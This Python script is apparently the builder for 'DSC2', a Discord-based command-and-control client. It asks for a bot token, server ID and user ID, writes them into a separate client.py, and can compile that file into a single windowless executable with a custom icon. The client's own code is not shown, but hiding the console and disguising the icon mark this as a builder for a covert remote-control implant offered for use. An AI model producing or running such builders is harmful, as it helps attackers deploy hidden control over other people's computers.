import os, sys, platform
from colorama import Fore, Style, init
import subprocess


is_windows = True if platform.system() == "Windows" else False

if is_windows:
    os.system("title DSC2 @ github.com/Elmerikh")

def clear():
    if is_windows:
        os.system("cls")
    else:
        os.system("clear")

def pause():
    if is_windows:
        os.system(f"pause >nul")
    else:
        input()

def leave():
    try:
        sys.exit()
    except:
        exit()

def error(error):
    print(red(f"        [!] Error : {error}"), end="")
    pause(); clear(); leave()

def red(text):
    os.system(""); faded = ""
    for line in text.splitlines():
        green = 250
        for character in line:
            green -= 5
            if green < 0:
                green = 0
            faded += (f"\033[38;2;255;{green};0m{character}\033[0m")
        faded += "\n"
    return faded

def blue(text):
    os.system(""); faded = ""
    for line in text.splitlines():
        green = 0
        for character in line:
            green += 3
            if green > 255:
                green = 255
            faded += (f"\033[38;2;0;{green};255m{character}\033[0m")
        faded += "\n"
    return faded

def water(text):
    os.system(""); faded = ""
    green = 10
    for line in text.splitlines():
        faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return faded

def purple(text):
    os.system("")
    faded = ""
    down = False

    for line in text.splitlines():
        red = 40
        for character in line:
            if down:
                red -= 3
            else:
                red += 3
            if red > 254:
                red = 255
                down = True
            elif red < 1:
                red = 30
                down = False
            faded += (f"\033[38;2;{red};0;220m{character}\033[0m")
    return faded


banner = f"""



                                        ### ##    ## ##    ## ##   ## ##    
                                        ##  ##  ##   ##  ##   ##  ##  ##   
                                        ##  ##  ####     ##           ##   
                                        ##  ##   #####   ##          ##    
                                        ##  ##      ###  ##         ##     
                                        ##  ##  ##   ##  ##   ##   #   ##  
                                        ### ##    ## ##    ## ##   ###### 



        {blue(f"[>] Running with Python {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}")}
        {blue(f"[>] github.com/Elmerikh ")}
        
"""

init()

clear()
print(water(banner), end="")

bot_token = input(Fore.BLUE + "        [>] Enter Your Bot Token : " + Fore.LIGHTMAGENTA_EX)
while not bot_token:
    print(Fore.RED + "        [!] Error : No Token ", end="")
    bot_token = str(input(Fore.BLUE + "        [>] Enter Your Bot Token : " + Fore.LIGHTMAGENTA_EX))
discord_server_id = input(Fore.BLUE + "        [>] Enter Your Discord Server ID : " + Fore.LIGHTMAGENTA_EX)
while not discord_server_id:
    print(Fore.RED + "        [!] Error : No Discord Server ID ", end="")
    discord_server_id = input(Fore.BLUE + "        [>] Enter Your Discord Server ID : " + Fore.LIGHTMAGENTA_EX)

user_id = input(Fore.BLUE + "        [>] Enter Your User ID : " + Fore.LIGHTMAGENTA_EX)
while not user_id:
    print(Fore.RED + "        [!] Error : No User ID ", end="")
    user_id = input(Fore.BLUE + "        [>] Enter Your User ID : " + Fore.LIGHTMAGENTA_EX)
# Open the client.py file and update the token values
with open('./client.py', 'r', encoding='utf-8') as file:
    filedata = file.read()

# Find the start and end markers
start_marker = '#start'
end_marker = '#end'
start_index = filedata.find(start_marker)
end_index = filedata.find(end_marker)

# Replace the token values with the new values
filedata = filedata[:start_index] + f'#start\nUSER_TOKEN={user_id }\nSERVER_TOKEN={discord_server_id }\nDISCORD_TOKEN="{bot_token}"\n#end' + filedata[end_index+len(end_marker):]

# Write the updated file data back to the file
with open('./client.py', 'w', encoding='utf-8') as file:
    file.write(filedata)
compile_choice = input("Do you want to compile into an executable? (y/n): ")
if compile_choice.lower() == 'y':
        # Run PyInstaller command
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--distpath=output", "--icon=./wew.ico", "client.py"])
    print(Fore.BLUE + "\n        [>] Done. File saved to Ouput. ", end="")

print(Fore.BLUE + "\n        [>] Press any key to exit... ", end="")
pause()
clear()
leave()